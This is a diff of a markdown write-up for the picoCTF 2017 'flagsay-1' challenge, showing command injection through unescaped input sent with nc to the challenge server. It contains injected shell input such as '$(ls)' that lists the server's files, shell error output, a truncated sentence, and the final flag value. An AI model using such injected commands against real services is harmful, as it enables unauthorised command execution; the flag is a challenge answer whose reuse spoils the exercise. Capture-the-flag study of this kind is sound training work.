@@ -35,30 +35,29 @@ Testing the program with random input,
 	  //                                                    
 	 //                                                     
 
+We can see that input gets inside of the flag.
+However, input is unescaped, so we can pass on a shell command like 
 
-However, input is unescaped, so we can pass on a shell command like
+     $ nc shell2017.picoctf.com 12442
+	aaaa"
+	               _                                        
+	              //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~     
+	             //aaaa /
+	sh: 4: //: Permission denied
+	sh: 5: //: Permission denied
+	sh: 6: //: Permission denied
+	sh: 7: //: Permission denied
+	sh: 8: //: Permission denied
+	sh: 9: //___________________________________/: not found
+	sh: 10: //: Permission denied
+	sh: 11: //: Permission denied
+	sh: 12: //: Permission denied
+	sh: 13: //: Permission denied
+	sh: 14: //: Permission denied
+	sh: 15: //: Permission denied
+	sh: 17: Syntax error: Unterminated quoted string
 
-    $ nc shell2017.picoctf.com 51865
-    $(ls)
-                   _                                        
-                  //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~     
-                 //flagsay-1
-    flagsay-1_no_aslr
-    flag.txt
-    xinetd_wrapper.sh                              /     
-                //                                   /      
-               //                                   /       
-              //                                   /        
-             //                                   /         
-            //                                   /          
-           //___________________________________/           
-          //                                                
-         //                                                 
-        //                                                  
-       //                                                   
-      //                                                    
-     //
-
+As seen ab
 Then, we can do something like this
 
     $ nc shell2017.picoctf.com 12442
@@ -83,5 +82,5 @@ Then, we can do something like this
 
 Therefore, the flag is `2ab2050bf32e84975a10d774a919e1d0`.
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbLTcxMDg2OTg4MV19
+eyJoaXN0b3J5IjpbLTQzMjU2MzgyN119
 -->
